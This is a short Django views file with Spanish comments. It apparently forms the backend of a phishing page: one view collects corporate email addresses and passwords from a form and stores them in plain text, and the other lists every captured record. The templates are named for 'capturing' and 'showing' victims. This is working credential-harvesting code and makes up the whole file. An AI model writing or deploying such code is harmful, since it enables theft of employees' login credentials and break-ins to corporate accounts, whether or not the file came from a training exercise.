from django.shortcuts import render

# Create your views here.
# views.py

from django.shortcuts import render,redirect
from .models import Usuario

def mostrar_usuarios(request):
    usuarios = Usuario.objects.all()
    return render(request, 'mostrarvictimas.html', {'usuarios': usuarios})

def guardar_usuario(request):
    if request.method == 'POST':
        correo_corporativo = request.POST.get('correo_corporativo')
        clave = request.POST.get('clave')
        usuario = Usuario(correo_corporativo=correo_corporativo, clave=clave)
        usuario.save()
        # Puedes redirigir a otra página después de guardar el usuario
        return redirect('guardar_usuario')
    return render(request, 'capturarvistimas.html')